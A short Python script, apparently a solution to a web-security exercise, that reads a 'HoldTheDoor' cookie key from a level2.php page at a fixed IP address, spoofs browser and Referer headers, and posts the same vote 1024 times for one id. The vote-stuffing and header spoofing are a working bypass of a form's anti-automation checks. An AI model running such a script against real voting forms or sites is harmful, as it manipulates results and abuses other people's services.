import requests
import time
from pprint import pprint

cp = 0
  
#r = requests.get('http://httpbin.org/headers', headers=headers)
for i in range(0, 2):
    headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
    "Accept-Encoding": "gzip, deflate", 
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", 
    "Dnt": "1", 
    "Host": "158.69.76.135",
    "Referer": "http://158.69.76.135/level2.php",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
    }
    page = "http://158.69.76.135/level2.php"
    r = requests.get(page)
    print(r.cookies.get_dict())
    #print(r.text)
    cookies = r.cookies.get_dict()
    print(cookies)
    key1 = cookies.get('HoldTheDoor')
    #print(key1)
    #r = requests.post('http://158.69.76.135/level1.php', data = {'id':'4', 'holdthedoor':'Envoyer', 'key': key1}, cookies=r.cookies)
    #time.sleep()
    for i in range (0, 1024):
        r = requests.post(page, cookies = cookies, headers = headers, data = {'id':'2490', 'holdthedoor':'Envoyer', 'key': key1})
        print(r.text)
        print(i)
